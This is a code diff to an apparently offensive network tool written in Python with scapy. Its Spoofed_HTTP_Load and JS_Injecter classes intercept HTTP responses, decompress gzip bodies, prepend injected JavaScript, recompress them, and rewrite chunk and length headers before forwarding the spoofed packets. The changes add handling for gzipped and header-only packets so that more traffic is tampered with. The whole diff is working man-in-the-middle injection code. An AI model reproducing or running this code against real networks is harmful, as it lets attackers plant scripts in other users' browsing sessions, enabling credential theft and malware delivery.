@@ -49,6 +49,10 @@ from scapy.all import *
 from src import packet_utilities
 from src.log import log
 
+class ForwardPacketPlease(Exception):
+    pass
+    
+
 class Spoofed_HTTP_Load(bytes):
     def _gzip_action_if_needed(self, load, action):
         if action == "compress": action_f = gzip.compress
@@ -156,25 +160,41 @@ class Spoofed_HTTP_Load(bytes):
             
         spoof_load = spoof_load.split(b"\r\n\r\n")
         
-        old_chunk_length, spoof_load[1] = self._remove_chunk_length_if_needed(self, spoof_load[1])
-        length_before_adding_code = len(spoof_load[1])
-        try:
-            spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "decompress")
-            print("gzip decompression worked")
-        except Exception as err:
-            #In this cases, the packet is not spoofed and the real packet is forwarded.
-            raise
+        if spoof_load[1]: #normal procedure: packet contains data appart from headers
+            old_chunk_length, spoof_load[1] = self._remove_chunk_length_if_needed(self, spoof_load[1])
+            length_before_adding_code = len(spoof_load[1])
+            try:
+                spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "decompress")
+                #print("gzip decompression worked")
+            except EOFError as err:
+                if err.args[0] == "Compressed file ended before the end-of-stream marker was reached":
+                    raise ForwardPacketPlease("Compressed file ended before the end-of-stream marker was reached")
+                else:
+                    raise
+            except Exception as err:
+                #In this cases, the packet is not spoofed and the real packet is forwarded.
+                raise
 
-                
-        spoof_load[1] = self.injected_code + spoof_load[1]
-        
-        
-        spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "compress") 
-        
-        length_after_adding_code = len(spoof_load[1])
+                    
+            spoof_load[1] = self.injected_code + spoof_load[1]
+            
+            
+            spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "compress") 
+            
+            length_after_adding_code = len(spoof_load[1])
 
+            
+            spoof_load[1] = self._update_and_add_chunk_length_if_needed(self, spoof_load[1], old_chunk_length, length_after_adding_code - length_before_adding_code)
         
-        spoof_load[1] = self._update_and_add_chunk_length_if_needed(self, spoof_load[1], old_chunk_length, length_after_adding_code - length_before_adding_code)
+        else: #unusual procedure: packet contains only headers
+            if not "gzip" in self.content_encoding_header: #this hasn't happened yet
+                spoof_load[1] = self.injected_code
+                if "chunked" in self.transfer_encoding_header:
+                    spoof_load[1] = self._update_and_add_chunk_length_if_needed(self, spoof_load[1], b"0\r\n", len(self.injected_code))
+                print(spoof_load[0].decode(), spoof_load[1].decode())
+                print("chunked without gzip in empty packet")
+            else:
+                raise ForwardPacketPlease("Empty gzipped packet")
         
         spoof_load = b"\r\n\r\n".join(spoof_load)
         
@@ -182,8 +202,8 @@ class Spoofed_HTTP_Load(bytes):
         spoof_load = self._shorten_load_if_needed(self, spoof_load, len(real_load))
         spoof_load = self._update_length_header_if_needed(self, real_load, spoof_load)
         
-        print(real_load)
-        print(spoof_load)
+        #print(real_load)
+        #print(spoof_load)
         #print(gzip.decompress(spoof_load.split(b"\r\n\r\n")[1].split(b"\r\n")[1][:len(self.injected_code)]))
         return super().__new__(self, spoof_load)
 
@@ -214,13 +234,16 @@ class JS_Injecter(threading.Thread):
     def _send_spoofed_packet(self, real_packet):
         try:
             spoof_load = Spoofed_HTTP_Load(real_packet.load, self.injected_code)
-        # ~ except EOFError:
-            # ~ log.js.warning("gzip")
-            # ~ self._forward_http_packet(real_packet)
-            # ~ return
+        except ForwardPacketPlease as err:
+            if err.args[0] == "Empty gzipped packet":
+                log.js.warning("gzipped_empty_packet")
+            elif err.args[0] == "Compressed file ended before the end-of-stream marker was reached":
+                log.js.warning("gzipped_uncomplete_packet")
+                
+            self._forward_http_packet(real_packet)
+            return
         except Exception as err:
-            log.error("js", "Unexpected error creating spoofed http load:", type(err), err)
-            print("Packet length:", len(real_packet))
+            log.error("js", "Unexpected error creating spoofed http load:", type(err), err, ". Original packet length:", len(real_packet))
             self._forward_http_packet(real_packet)
             #raise
             return
@@ -257,19 +280,20 @@ class JS_Injecter(threading.Thread):
     def handle_packet(self, packet):
         if not self._has_packet_been_handled(packet):
             self._add_handled_packet(packet)
+            self._send_spoofed_packet(packet)
             
-            if packet.load.split(b"\r\n\r\n")[1]:
-                #print(packet["TCP"].ack, packet["TCP"].seq, packet["TCP"].chksum, "entered to:", self.handled_packets)
-                self._send_spoofed_packet(packet)
-            else:
-                #Some packets are not HTTP 200 OK.
-                #Some packets arrive divided in: 1st packet http header, 2nd packet http body.
-                #If there's chunked encoding, maybe i can add my own chunk there. the problem is if there's also
-                #gzip encoding, then i can do nothing. This happens most of the times, so it's better 
-                #just to forward those packets.
-                log.js.warning("empty_packet")
-                #print(packet.load.decode())
-                self._forward_http_packet(packet)
+            # ~ if packet.load.split(b"\r\n\r\n")[1]:
+                # ~ #print(packet["TCP"].ack, packet["TCP"].seq, packet["TCP"].chksum, "entered to:", self.handled_packets)
+                # ~ self._send_spoofed_packet(packet)
+            # ~ else:
+                # ~ #Some packets are not HTTP 200 OK.
+                # ~ #Some packets arrive divided in: 1st packet http header, 2nd packet http body.
+                # ~ #If there's chunked encoding, maybe i can add my own chunk there. the problem is if there's also
+                # ~ #gzip encoding, then i can do nothing. This happens most of the times, so it's better 
+                # ~ #just to forward those packets.
+                # ~ log.js.warning("empty_packet")
+                # ~ #print(packet.load.decode())
+                # ~ self._forward_http_packet(packet)
                 
         
     def run(self):
